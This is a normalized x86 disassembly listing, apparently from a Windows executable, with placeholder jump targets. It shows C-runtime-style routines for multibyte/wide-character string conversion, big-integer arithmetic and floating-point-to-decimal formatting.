movzx eax [ eax + ecx * 2 ]
and eax 0x8000
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x10 ]
and [ ecx + 0x350 ] 0xfffffffd
sub_418b62
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi [ ebp + 0x18 ]
push edi
test esi esi
jle r-xdata
mov edi [ ebp + 0x24 ]
test edi edi
jne r-xdata
push esi
push [ ebp + 0x14 ]
call sub_41b817
pop ecx
cmp eax esi
pop ecx
lea esi [ eax + 0x1 ]
jl r-xdata
xor eax eax
cmp [ ebp + 0x28 ] eax
push 0x0
push 0x0
push esi
push [ ebp + 0x14 ]
setne al
lea eax [ eax * 8 + 0x1 ]
push eax
push edi
call [ MultiByteToWideChar@IAT ]
mov [ ebp - 0x8 ] eax
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov edi [ eax + 0x8 ]
mov [ ebp + 0x24 ] edi
mov esi eax
lea esp [ ebp - 0x14 ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40a8ab
mov esp ebp
pop ebp
retn
lea edx [ eax + eax ]
lea ecx [ edx + 0x8 ]
cmp edx ecx
sbb eax eax
test ecx eax
je r-xdata
xor ebx ebx
lea ecx [ edx + 0x8 ]
cmp edx ecx
sbb eax eax
and eax ecx
lea ecx [ edx + 0x8 ]
cmp eax 0x400
ja r-xdata
xor esi esi
push [ ebp - 0x8 ]
push ebx
push esi
push [ ebp + 0x14 ]
push 0x1
push edi
call [ MultiByteToWideChar@IAT ]
test eax eax
je r-xdata
cmp edx ecx
sbb eax eax
and eax ecx
push eax
call sub_411e67
mov ebx eax
pop ecx
test ebx ebx
je r-xdata
cmp edx ecx
sbb eax eax
and eax ecx
call sub_41d390
mov ebx esp
test ebx ebx
je r-xdata
mov edi [ ebp - 0x8 ]
xor eax eax
push eax
push eax
push eax
push eax
push eax
push edi
push ebx
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call sub_412cd5
mov esi eax
test esi esi
je r-xdata
mov [ ebx ] 0xdddd
mov [ ebx ] 0xcccc
jmp r-xdata
test [ ebp + 0x10 ] 0x400
je r-xdata
test ebx ebx
je r-xdata
add ebx 0x8
jmp r-xdata
lea edx [ esi + esi ]
lea ecx [ edx + 0x8 ]
cmp edx ecx
sbb eax eax
test ecx eax
je r-xdata
mov eax [ ebp + 0x20 ]
test eax eax
je r-xdata
xor edi edi
lea ecx [ edx + 0x8 ]
cmp edx ecx
sbb eax eax
and eax ecx
lea ecx [ edx + 0x8 ]
cmp eax 0x400
ja r-xdata
push ebx
call sub_4176fd
pop ecx
mov eax esi
cmp esi eax
jg r-xdata
push edi
call sub_4176fd
pop ecx
push 0x0
push 0x0
push 0x0
push esi
push edi
push [ ebp - 0x8 ]
push ebx
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call sub_412cd5
test eax eax
je r-xdata
cmp edx ecx
sbb eax eax
and eax ecx
push eax
call sub_411e67
mov edi eax
pop ecx
test edi edi
je r-xdata
cmp edx ecx
sbb eax eax
and eax ecx
call sub_41d390
mov edi esp
test edi edi
je r-xdata
xor ecx ecx
push ecx
push ecx
push ecx
push eax
push [ ebp + 0x1c ]
push edi
push ebx
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call sub_412cd5
mov esi eax
test esi esi
jne r-xdata
xor eax eax
push eax
push eax
cmp [ ebp + 0x20 ] eax
jne r-xdata
mov [ edi ] 0xdddd
mov [ edi ] 0xcccc
jmp r-xdata
jmp r-xdata
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
jmp r-xdata
push eax
push eax
test edi edi
je r-xdata
add edi 0x8
jmp r-xdata
push esi
push edi
push eax
push [ ebp + 0x24 ]
call [ WideCharToMultiByte@IAT ]
mov esi eax
test esi esi
jne r-xdata
push edi
call sub_4176fd
pop ecx
jmp r-xdata
sub_418d7f
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x10 ]
call sub_40ee04
push [ ebp + 0x28 ]
lea eax [ ebp - 0xc ]
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_418b62
add esp 0x24
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x10 ]
and [ ecx + 0x350 ] 0xfffffffd
sub_418dca
mov edi edi
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
push esi
test edx edx
jne r-xdata
cmp [ ebp + 0xc ] 0x0
jbe r-xdata
call sub_4135e3
push 0x16
mov ecx [ ebp + 0x10 ]
mov [ edx ] 0x0
test ecx ecx
jle r-xdata
pop esi
pop ebp
retn
xor eax eax
mov eax ecx
jmp r-xdata
mov esi [ ebp + 0x14 ]
test esi esi
je r-xdata
call sub_4135e3
push 0x22
jmp r-xdata
inc eax
cmp [ ebp + 0xc ] eax
ja r-xdata
push ebx
lea ebx [ edx + 0x1 ]
mov eax ebx
push edi
mov edi [ esi + 0x8 ]
mov [ edx ] 0x30
test ecx ecx
jle r-xdata
pop esi
mov [ eax ] esi
call sub_413527
mov eax esi
jmp r-xdata
mov [ eax ] 0x0
test ecx ecx
js r-xdata
mov bl [ edi ]
test bl bl
je r-xdata
cmp [ edx ] 0x31
jne r-xdata
cmp [ edi ] 0x35
jl r-xdata
mov bl 0x30
inc edi
jmp r-xdata
mov ecx ebx
lea esi [ ecx + 0x1 ]
inc [ esi + 0x4 ]
jmp r-xdata
jmp r-xdata
lea ebx [ edx + 0x1 ]
mov [ eax ] bl
inc eax
dec ecx
test ecx ecx
jg r-xdata
mov al [ ecx ]
inc ecx
test al al
jne r-xdata
sub ecx esi
lea eax [ ecx + 0x1 ]
push eax
push ebx
push edx
call sub_40dcd0
add esp 0xc
pop edi
xor eax eax
pop ebx
dec eax
cmp [ eax ] 0x39
je r-xdata
mov [ eax ] 0x30
inc [ eax ]
sub_418e86
mov edi edi
push esi
mov esi ecx
push esi
call sub_41b833
mov eax [ esi ]
and eax 0x1f
pop ecx
cmp al 0x1f
jne r-xdata
push esi
call sub_41b899
pop ecx
mov [ esi + 0x8 ] 0x1
mov [ esi + 0x8 ] 0x0
jmp r-xdata
mov eax esi
pop esi
retn
sub_418eb0
mov edi edi
push ebp
mov ebp esp
sub esp 0x21c
push ebx
mov ebx [ ebp + 0x8 ]
mov eax [ ebx ]
test eax eax
jne r-xdata
push edi
mov edi [ ebp + 0xc ]
mov ecx [ edi ]
test ecx ecx
jne r-xdata
xor edx edx
pop ebx
mov esp ebp
pop ebp
retn
push esi
lea esi [ eax - 0x1 ]
lea eax [ ecx - 0x1 ]
mov [ ebp - 0xc ] esi
test eax eax
jne r-xdata
pop edi
xor eax eax
xor edx edx
pop ebx
mov esp ebp
pop ebp
retn
cmp eax esi
ja r-xdata
mov ecx [ edi + 0x4 ]
mov [ ebp - 0x28 ] ecx
cmp ecx 0x1
jne r-xdata
pop esi
pop edi
xor eax eax
xor edx edx
pop ebx
mov esp ebp
pop ebp
retn
mov edx esi
lea ecx [ eax + 0x1 ]
sub edx eax
mov [ ebp - 0x38 ] ecx
mov ecx esi
cmp esi edx
jl r-xdata
test esi esi
jne r-xdata
mov esi [ ebx + 0x4 ]
lea ecx [ ebx + 0x4 ]
push eax
mov [ ebp - 0x21c ] eax
mov [ ebx ] eax
lea eax [ ebp - 0x218 ]
push eax
push 0x1cc
push ecx
call sub_416ee3
add esp 0x10
mov eax esi
xor edx edx
pop esi
pop edi
pop ebx
mov esp ebp
pop ebp
retn
inc edx
mov eax ecx
inc esi
sub eax edx
lea esi [ ebx + esi * 4 ]
lea edi [ edi + eax * 4 ]
add edi 0x4
xor edi edi
mov [ ebp - 0x8 ] 0x0
mov [ ebp - 0x4 ] 0x0
mov [ ebp - 0x10 ] edi
cmp esi 0xffffffff
je r-xdata
mov esi [ ebx + 0x4 ]
lea eax [ ebp - 0x218 ]
push 0x0
push eax
lea edi [ ebx + 0x4 ]
mov [ ebp - 0x21c ] 0x0
push 0x1cc
push edi
mov [ ebx ] 0x0
call sub_416ee3
xor edx edx
mov eax esi
div [ ebp - 0x28 ]
add esp 0x10
xor ecx ecx
cmp ecx edx
mov [ edi ] edx
sbb ecx ecx
pop esi
neg ecx
xor edx edx
pop edi
mov [ ebx ] ecx
pop ebx
mov esp ebp
pop ebp
retn
mov edi [ ebp - 0x38 ]
mov eax [ ebp + 0xc ]
mov esi [ eax + edi * 4 ]
mov eax [ eax + edi * 4 - 0x4 ]
mov [ ebp - 0x20 ] eax
bsr eax esi
mov [ ebp - 0x34 ] esi
je r-xdata
mov esi [ ebp + 0xc ]
mov eax ecx
sub eax edx
mov eax [ esi + eax * 4 + 0x4 ]
cmp eax [ ebx + ecx * 4 + 0x4 ]
jae r-xdata
dec ecx
sub edi 0x4
sub esi 0x4
cmp ecx edx
jge r-xdata
push 0x0
lea eax [ ebp - 0x218 ]
mov [ ebp - 0x21c ] 0x0
push eax
lea esi [ ebx + 0x4 ]
mov [ ebx ] 0x0
push 0x1cc
push esi
call sub_416ee3
mov eax [ ebp - 0x10 ]
add esp 0x10
mov edx [ ebp - 0x4 ]
xor ecx ecx
cmp ecx eax
mov [ esi ] edi
mov [ ebx + 0x8 ] eax
mov eax [ ebp - 0x8 ]
sbb ecx ecx
neg ecx
pop esi
inc ecx
pop edi
mov [ ebx ] ecx
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0xc ]
inc esi
inc eax
mov [ ebp - 0x1c ] eax
lea esi [ ebx + esi * 4 ]
lea esp [ esp ]
mov ecx 0x20
mov ecx 0x1f
sub ecx eax
jmp r-xdata
test edx edx
jne r-xdata
mov eax [ edi ]
cmp eax [ esi ]
jne r-xdata
jmp r-xdata
push 0x0
push ecx
xor eax eax
or eax [ esi ]
push edi
push eax
call sub_41d150
mov [ ebp - 0x40 ] edx
lea esi [ esi - 0x4 ]
xor edx edx
mov [ ebp - 0x10 ] ebx
mov edi ecx
add edx eax
mov ecx [ ebp - 0x8 ]
adc ecx 0x0
mov [ ebp - 0x8 ] edx
sub [ ebp - 0x1c ] 0x1
mov [ ebp - 0x4 ] ecx
mov ecx [ ebp - 0x28 ]
jne r-xdata
mov ebx [ ebp + 0x8 ]
xor esi esi
mov [ ebp - 0x48 ] 0x0
add edx 0xffffffff
mov [ ebp - 0x1c ] edx
js r-xdata
mov eax [ ebp - 0x20 ]
mov ecx [ ebp - 0x3c ]
shr eax cl
mov ecx [ ebp - 0x24 ]
shl [ ebp - 0x20 ] cl
shl esi cl
or esi eax
mov [ ebp - 0x34 ] esi
cmp edi 0x2
jbe r-xdata
mov eax 0x20
mov [ ebp - 0x24 ] ecx
sub eax ecx
mov [ ebp - 0x3c ] eax
test ecx ecx
je r-xdata
xor edi edi
lea ecx [ ebx + 0x4 ]
lea ecx [ ecx + edx * 4 ]
mov [ ebp - 0x10 ] ecx
lea eax [ edx + edi ]
lea ecx [ ebx - 0x4 ]
mov [ ebp - 0x8 ] eax
lea ecx [ ecx + eax * 4 ]
mov [ ebp - 0x4c ] ecx
mov esi [ ebp + 0xc ]
mov ecx [ ebp - 0x3c ]
mov eax [ esi + edi * 4 - 0x8 ]
shr eax cl
or [ ebp - 0x20 ] eax
mov [ ebx ] edx
test edx edx
je r-xdata
lea ecx [ eax + 0x1 ]
lea ecx [ ebx + ecx * 4 ]
jmp r-xdata
xor eax eax
mov eax [ ecx + 0x8 ]
jmp r-xdata
mov edx esi
mov eax edi
pop esi
pop edi
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ ebx ]
cmp [ ebx + ecx * 4 ] 0x0
jne r-xdata
mov [ ecx ] 0x0
lea ecx [ ecx + 0x4 ]
inc eax
cmp eax [ ebx ]
jb r-xdata
push 0x0
push [ ebp - 0x34 ]
push eax
push edx
call sub_41d150
mov [ ebp - 0x28 ] ebx
xor esi esi
mov ebx eax
mov [ ebp - 0x28 ] esi
mov eax edx
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x18 ] eax
mov edi ecx
mov [ ebp - 0x44 ] ebx
mov [ ebp - 0x40 ] eax
test eax eax
jne r-xdata
mov edi ecx
mov eax edx
mov ecx [ ebp - 0x3c ]
xor esi esi
mov edx [ ebp - 0x4 ]
shr edi cl
mov ecx [ ebp - 0x24 ]
call sub_41d3c0
mov ecx [ ebp - 0x24 ]
or esi edx
or edi eax
mov eax esi
mov esi [ ebp - 0x14 ]
mov edx edi
shl esi cl
cmp [ ebp - 0x8 ] 0x3
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x14 ] esi
jb r-xdata
cmp [ ebp - 0x24 ] 0x0
mov edx [ ecx + 0x4 ]
mov ecx [ ecx ]
mov [ ebp - 0x30 ] eax
mov [ ebp - 0x28 ] 0x0
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x14 ] ecx
jbe r-xdata
add ecx 0xffffffff
mov [ ebx ] ecx
jne r-xdata
push 0x0
push [ ebp - 0x34 ]
add ebx 0x1
adc eax 0xffffffff
push eax
push ebx
call sub_41d330
add edi eax
adc esi edx
or ebx 0xffffffff
xor eax eax
mov [ ebp - 0x28 ] esi
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x44 ] ebx
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x40 ] eax
cmp ebx 0xffffffff
jbe r-xdata
mov eax [ ebp - 0x38 ]
add eax [ ebp - 0x1c ]
mov ecx [ ebp - 0x3c ]
mov eax [ ebx + eax * 4 - 0x8 ]
shr eax cl
or esi eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x14 ] esi
test eax eax
jne r-xdata
jb r-xdata
test esi esi
ja r-xdata
mov ecx [ ebp - 0x38 ]
xor edi edi
xor esi esi
test ecx ecx
je r-xdata
test ebx ebx
je r-xdata
push eax
push ebx
xor ecx ecx
mov esi edi
or ecx [ ebp - 0x14 ]
push 0x0
push [ ebp - 0x20 ]
mov [ ebp - 0x4 ] ecx
call sub_41d330
cmp edx esi
jb r-xdata
cmp edi 0xffffffff
ja r-xdata
xor eax eax
cmp eax esi
ja r-xdata
mov eax [ ebp + 0xc ]
mov ebx [ ebp - 0x10 ]
add eax 0x4
mov [ ebp - 0x14 ] eax
mov [ ebp - 0xc ] ecx
mov esi [ ebp - 0x48 ]
xor eax eax
mov edx [ ebp - 0x1c ]
add eax ebx
mov ecx [ ebp - 0x4c ]
mov edi eax
mov eax [ ebp - 0x8 ]
adc esi 0x0
sub [ ebp - 0x10 ] 0x4
dec edx
mov ebx [ ebp + 0x8 ]
sub ecx 0x4
dec eax
mov [ ebp - 0x48 ] edi
mov [ ebp - 0x1c ] edx
mov [ ebp - 0x4c ] ecx
mov [ ebp - 0x8 ] eax
test edx edx
jns r-xdata
mov eax [ ebp - 0x18 ]
ja r-xdata
mov eax [ ebp - 0x8 ]
dec eax
mov [ ebp - 0xc ] eax
jb r-xdata
sub eax ecx
mov [ ebx ] eax
add ebx 0x4
mov eax [ ebp - 0x14 ]
add eax 0x4
sub [ ebp - 0xc ] 0x1
mov [ ebp - 0x14 ] eax
jne r-xdata
add edi 0x1
adc esi esi
cmp eax [ ebp - 0xc ]
ja r-xdata
jmp r-xdata
mov eax [ ebp - 0x18 ]
add ebx 0xffffffff
mov [ ebp - 0x44 ] ebx
adc eax 0xffffffff
add edi [ ebp - 0x34 ]
mov [ ebp - 0x18 ] eax
adc [ ebp - 0x28 ] 0x0
mov [ ebp - 0x40 ] eax
jne r-xdata
cmp eax [ ebp - 0x4 ]
jbe r-xdata
test ecx ecx
je r-xdata
cmp [ ebp - 0x30 ] edi
jae r-xdata
mov eax [ eax ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp - 0x40 ]
mul [ ebp - 0x28 ]
mov ecx eax
mov eax [ ebp - 0x44 ]
mul [ ebp - 0x28 ]
add edx ecx
add edi eax
mov eax [ ebx ]
mov ecx edi
adc esi edx
mov edi esi
xor esi esi
cmp eax ecx
jae r-xdata
mov ebx [ ebp - 0x4 ]
mov ecx [ ebp - 0x38 ]
mov edx [ ebp - 0xc ]
inc edx
mov eax edx
cmp eax [ ebx ]
jae r-xdata
mov [ ebp - 0x4 ] ebx
cmp edi 0xffffffff
jbe r-xdata
add ebx 0xffffffff
adc [ ebp - 0x18 ] 0xffffffff
mov esi [ ebp + 0xc ]
mov edi ecx
mov edx [ ebp - 0x10 ]
add esi 0x4
mov ebx eax
lea esp [ esp ]
jmp r-xdata
mov ecx [ edx ]
lea esi [ esi + 0x4 ]
xor eax eax
lea edx [ edx + 0x4 ]
add ecx [ esi - 0x4 ]
adc eax eax
add ecx ebx
mov [ edx - 0x4 ] ecx
adc eax 0x0
mov ebx eax
sub edi 0x1
jne r-xdata
mov ebx [ ebp - 0x4 ]
sub_41935e
mov edi edi
push ebp
mov ebp esp
sub esp 0x964
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
mov ebx [ ebp + 0x18 ]
lea ecx [ ebp - 0x794 ]
push esi
push edi
mov edi [ ebp + 0x14 ]
mov [ ebp - 0x780 ] edi
mov [ ebp - 0x77c ] ebx
call sub_418e86
mov esi [ ebp + 0xc ]
xor eax eax
mov ecx esi
and ecx 0x80000000
or eax ecx
mov al 0x2d
jne r-xdata
movsx eax al
mov ecx esi
mov [ edi ] eax
and ecx 0x7ff00000
xor eax eax
mov [ edi + 0x8 ] ebx
or eax ecx
mov edi [ ebp + 0x8 ]
jne r-xdata
add al 0xf3
lea eax [ ebp + 0x8 ]
push eax
call sub_414fe6
pop ecx
test eax eax
je r-xdata
mov ecx esi
mov eax edi
and ecx 0xfffff
or eax ecx
jne r-xdata
sub eax 0x1
je r-xdata
mov ecx [ ebp - 0x780 ]
mov [ ecx + 0x4 ] 0x1
mov eax [ ebp - 0x780 ]
push r--data
and [ eax + 0x4 ] 0x0
jmp r-xdata
push r--data
sub eax 0x1
je r-xdata
push [ ebp + 0x1c ]
push ebx
call sub_411dd3
add esp 0xc
test eax eax
jne r-xdata
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_413537
int3
cmp [ ebp - 0x78c ] 0x0
pop edi
pop esi
pop ebx
je r-xdata
push r--data
jmp r-xdata
sub eax 0x1
je r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40a8ab
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x794 ]
push eax
call sub_41b850
pop ecx
push r--data
jmp r-xdata
sub eax 0x1
je r-xdata
push r--data
jmp r-xdata
mov eax [ ebp + 0x10 ]
and esi 0x7fffffff
and [ ebp - 0x784 ] 0x0
inc eax
mov [ ebp + 0x8 ] edi
mov [ ebp + 0xc ] esi
fld [ ebp + 0x8 ]
fst [ ebp - 0x768 ]
mov edi [ ebp - 0x764 ]
mov ecx edi
mov [ ebp - 0x778 ] eax
shr ecx 0x14
mov eax ecx
and eax 0x7ff
or eax 0x0
jne r-xdata
xor dl dl
mov esi 0x100000
xor eax eax
mov dl 0x1
xor esi esi
jmp r-xdata
xor eax eax
mov [ ebp - 0x76c ] eax
cmp eax 0x80000000
jne r-xdata
mov ebx [ ebp - 0x768 ]
and edi 0xfffff
add ebx eax
adc edi esi
xor eax eax
test dl dl
setne al
and ecx 0x7ff
inc eax
lea esi [ ecx - 0x434 ]
add esi eax
mov [ ebp - 0x74c ] esi
call sub_41b930
push ecx
push ecx
fstp [ esp ]
call sub_41ba40
pop ecx
pop ecx
call sub_41d3e0
mov [ ebp - 0x76c ] eax
cmp eax 0x7fffffff
je r-xdata
cmp esi 0xfffffc02
je r-xdata
and [ ebp - 0x570 ] 0x0
push 0x2
pop esi
mov [ ebp - 0x56c ] 0x100000
mov [ ebp - 0x574 ] esi
cmp ebx esi
jne r-xdata
mov [ ebp - 0x1d0 ] ebx
xor ebx ebx
test edi edi
mov [ ebp - 0x1cc ] edi
setne bl
inc ebx
mov [ ebp - 0x1d4 ] ebx
test esi esi
js r-xdata
mov eax [ ebp + ebx * 4 - 0x1d4 ]
and [ ebp - 0x764 ] 0x0
bsr eax eax
je r-xdata
and [ ebp - 0x570 ] 0x0
push 0x2
pop ecx
mov [ ebp - 0x56c ] 0x100000
mov [ ebp - 0x574 ] ecx
cmp ebx ecx
jne r-xdata
mov eax [ ebp - 0x74c ]
xor edx edx
inc eax
mov edi eax
and eax 0x1f
push 0x20
pop ecx
sub ecx eax
mov [ ebp - 0x750 ] eax
xor eax eax
shr edi 0x5
inc eax
mov [ ebp - 0x74c ] edi
mov [ ebp - 0x770 ] ecx
call sub_41d3c0
mov ecx [ ebp + ebx * 4 - 0x1d4 ]
dec eax
and [ ebp - 0x764 ] 0x0
bsr ecx ecx
mov [ ebp - 0x758 ] eax
not eax
mov [ ebp - 0x774 ] eax
je r-xdata
xor ecx ecx
xor ecx ecx
lea ecx [ eax + 0x1 ]
jmp r-xdata
xor edx edx
xor ecx ecx
inc ecx
jmp r-xdata
add ecx 0x4
cmp ecx 0x8
jne r-xdata
xor al al
test al al
je r-xdata
push 0x20
pop eax
sub eax ecx
cmp eax 0x1
setb al
cmp ebx 0x73
mov [ ebp - 0x745 ] al
seta cl
cmp ebx 0x73
jne r-xdata
add edx 0x4
cmp edx 0x8
jne r-xdata
xor al al
test al al
je r-xdata
push 0x20
pop eax
sub eax ecx
lea edx [ ebx + edi ]
cmp [ ebp - 0x750 ] eax
mov [ ebp - 0x760 ] edx
seta al
cmp edx 0x73
mov [ ebp - 0x745 ] al
seta cl
cmp edx 0x73
jne r-xdata
mov eax [ ebp + ecx - 0x570 ]
cmp eax [ ebp + ecx - 0x1d0 ]
jne r-xdata
mov eax [ ebp - 0x74c ]
xor edx edx
add eax 0x2
mov esi eax
and eax 0x1f
push 0x20
pop ecx
sub ecx eax
mov [ ebp - 0x75c ] eax
xor eax eax
shr esi 0x5
inc eax
mov [ ebp - 0x750 ] esi
mov [ ebp - 0x770 ] ecx
call sub_41d3c0
and [ ebp - 0x764 ] 0x0
dec eax
bsr ecx edi
mov [ ebp - 0x758 ] eax
not eax
mov [ ebp - 0x774 ] eax
je r-xdata
and [ ebp - 0x574 ] 0x0
lea eax [ ebp - 0x570 ]
and [ ebp - 0x1d4 ] 0x0
push 0x0
push eax
lea eax [ ebp - 0x1d0 ]
push 0x1cc
push eax
call sub_416ee3
add esp 0x10
test al al
jne r-xdata
mov al 0x1
jmp r-xdata
mov eax [ ebp + edx - 0x570 ]
cmp eax [ ebp + edx - 0x1d0 ]
jne r-xdata
and [ ebp - 0x764 ] 0x0
bsr eax edi
je r-xdata
xor eax eax
mov ebx 0x1cc
push eax
mov [ ebp - 0x574 ] eax
mov [ ebp - 0x1d4 ] eax
lea eax [ ebp - 0x570 ]
push eax
lea eax [ ebp - 0x1d0 ]
push ebx
push eax
call sub_416ee3
add esp 0x10
test al al
jne r-xdata
mov al 0x1
jmp r-xdata
xor ecx ecx
inc ecx
jmp r-xdata
neg eax
div ecx
mov [ ebp - 0x754 ] eax
mov ecx edx
mov [ ebp - 0x758 ] ecx
test eax eax
je r-xdata
div ecx
mov [ ebp - 0x770 ] eax
mov ecx edx
mov [ ebp - 0x764 ] ecx
test eax eax
je r-xdata
push 0x72
pop ecx
cmp ebx ecx
jae r-xdata
test cl cl
jne r-xdata
xor edx edx
lea edx [ eax + 0x1 ]
jmp r-xdata
lea eax [ ebp - 0x570 ]
push eax
lea eax [ ebp - 0x3a0 ]
push ebx
push eax
call sub_416ee3
add esp 0x10
jmp r-xdata
push 0x72
pop ecx
cmp edx ecx
jb r-xdata
test cl cl
jne r-xdata
xor al al
test al al
je r-xdata
push 0x20
pop eax
sub eax ecx
lea edx [ esi + 0x2 ]
cmp [ ebp - 0x75c ] eax
mov [ ebp - 0x754 ] edx
seta al
cmp edx 0x73
mov [ ebp - 0x745 ] al
seta cl
cmp edx 0x73
jne r-xdata
test ecx ecx
je r-xdata
cmp eax 0x26
jbe r-xdata
test ecx ecx
je r-xdata
cmp eax 0x26
jbe r-xdata
cmp ecx 0xffffffff
je r-xdata
mov ecx ebx
and [ ebp - 0x750 ] 0x0
mov edx [ edi ]
mov [ ebp - 0x750 ] edx
jmp r-xdata
push 0x20
pop eax
sub eax edx
mov esi ecx
cmp eax ecx
lea eax [ ebp - 0x1c8 ]
mov [ ebp - 0x754 ] eax
mov edi eax
setb [ ebp - 0x745 ]
mov eax [ ebp - 0x76c ]
xor edx edx
push 0xa
pop ecx
mov [ ebp - 0x774 ] ecx
test eax eax
js r-xdata
mov eax edx
mov [ ebp - 0x754 ] eax
cmp edx 0xffffffff
je r-xdata
mov edx ecx
mov [ ebp - 0x760 ] ecx
xor eax eax
mov ebx 0x1cc
push eax
mov [ ebp - 0x574 ] eax
mov [ ebp - 0x1d4 ] eax
lea eax [ ebp - 0x570 ]
push eax
lea eax [ ebp - 0x1d0 ]
push ebx
push eax
call sub_416ee3
add esp 0x10
test al al
jne r-xdata
mov al 0x1
jmp r-xdata
mov edi [ ebp - 0x77c ]
mov esi edi
mov ecx [ ebp - 0x1d4 ]
mov [ ebp - 0x74c ] esi
test ecx ecx
je r-xdata
mov eax [ ecx * 4 + r--data ]
mov [ ebp - 0x764 ] eax
test eax eax
je r-xdata
movzx ecx [ eax * 4 + r--data ]
movzx esi [ eax * 4 + r--data ]
mov edi ecx
mov [ ebp - 0x74c ] eax
shl edi 0x2
push edi
lea eax [ ecx + esi ]
mov [ ebp - 0x574 ] eax
lea eax [ ebp - 0x570 ]
push 0x0
push eax
call sub_40be70
mov eax esi
shl eax 0x2
push eax
mov eax [ ebp - 0x74c ]
movzx eax [ eax * 4 + r--data ]
lea eax [ eax * 4 + r--data ]
push eax
lea eax [ ebp - 0x570 ]
add eax edi
push eax
call sub_40b8f0
mov ecx [ ebp - 0x574 ]
add esp 0x18
mov [ ebp - 0x760 ] ecx
cmp ecx 0x1
ja r-xdata
push 0x26
pop eax
mov edi [ ecx * 4 + r--data ]
test edi edi
jne r-xdata
movzx ecx [ eax * 4 + r--data ]
movzx esi [ eax * 4 + r--data ]
mov edi ecx
mov [ ebp - 0x75c ] eax
shl edi 0x2
push edi
lea eax [ ecx + esi ]
mov [ ebp - 0x574 ] eax
lea eax [ ebp - 0x570 ]
push 0x0
push eax
call sub_40be70
mov eax esi
shl eax 0x2
push eax
mov eax [ ebp - 0x75c ]
movzx eax [ eax * 4 + r--data ]
lea eax [ eax * 4 + r--data ]
push eax
lea eax [ ebp - 0x570 ]
add eax edi
push eax
call sub_40b8f0
mov ecx [ ebp - 0x574 ]
add esp 0x18
mov [ ebp - 0x760 ] ecx
cmp ecx 0x1
ja r-xdata
push 0x26
pop eax
cmp [ ebp - 0x745 ] 0x0
je r-xdata
lea edi [ ebp - 0x1d0 ]
mov esi ecx
lea edi [ edi + ecx * 4 ]
mov [ ebp - 0x754 ] edi
xor edx edx
mov edx [ edi - 0x4 ]
jmp r-xdata
lea eax [ esi - 0x1 ]
cmp eax ebx
jae r-xdata
test edi edi
je r-xdata
mov esi edx
lea ecx [ ebp - 0x1d0 ]
mov edx [ ebp - 0x74c ]
sub esi edx
lea ecx [ ecx + esi * 4 ]
mov [ ebp - 0x75c ] ecx
push 0x72
pop ecx
cmp edx ecx
jb r-xdata
test cl cl
jne r-xdata
lea eax [ ebp - 0x3a4 ]
push eax
lea eax [ ebp - 0x1d4 ]
push eax
call sub_418eb0
pop ecx
pop ecx
push 0xa
pop edx
cmp eax edx
jne r-xdata
xor esi esi
xor edi edi
xor eax eax
push eax
mov [ ebp - 0x1d4 ] eax
mov [ ebp - 0x964 ] eax
cmp eax 0x1
je r-xdata
cmp [ ebp - 0x1d4 ] 0x1
ja r-xdata
mov edi [ ebp - 0x570 ]
test edi edi
jne r-xdata
cmp edi 0x1
je r-xdata
xor eax eax
mov [ ebp - 0x964 ] eax
mov [ ebp - 0x3a4 ] eax
push eax
jmp r-xdata
cmp [ ebp - 0x3a4 ] 0x1
ja r-xdata
mov edi [ ebp - 0x570 ]
test edi edi
jne r-xdata
mov [ ebp - 0x1d4 ] ecx
jmp r-xdata
lea eax [ ecx + 0x1 ]
mov [ ebp - 0x1d4 ] eax
jmp r-xdata
and [ ebp - 0x750 ] 0x0
mov edx [ edi ]
mov [ ebp - 0x750 ] edx
jmp r-xdata
xor eax eax
cmp [ ebp - 0x745 ] al
setne al
add eax ecx
sub ecx [ ebp - 0x74c ]
mov edi ecx
mov [ ebp - 0x1d4 ] eax
shr edi 0x5
lea eax [ ebp - 0x570 ]
mov esi edi
mov [ ebp - 0x758 ] ecx
shl esi 0x2
push esi
push 0x0
push eax
call sub_40be70
mov ecx [ ebp - 0x758 ]
xor eax eax
inc eax
and ecx 0x1f
shl eax cl
mov [ ebp + esi - 0x570 ] eax
lea eax [ edi + 0x1 ]
jmp r-xdata
mov ebx [ ebp - 0x1d4 ]
jmp r-xdata
mov eax [ ebp - 0x750 ]
sub edi 0x4
shl eax 0x2
shr edx 0x1e
xor edx eax
mov eax [ ebp - 0x754 ]
dec esi
mov [ eax ] edx
sub eax 0x4
mov [ ebp - 0x754 ] eax
cmp esi 0xffffffff
je r-xdata
cmp [ ebp - 0x745 ] 0x0
mov ebx 0x1cc
je r-xdata
mov ecx edi
xor eax eax
lea edi [ ebp - 0x1d0 ]
[ edi ]
mov edx [ ebp - 0x760 ]
mov edi [ ebp - 0x74c ]
push 0x2
pop esi
cmp esi ebx
jae r-xdata
mov ecx edx
mov [ ebp - 0x760 ] ecx
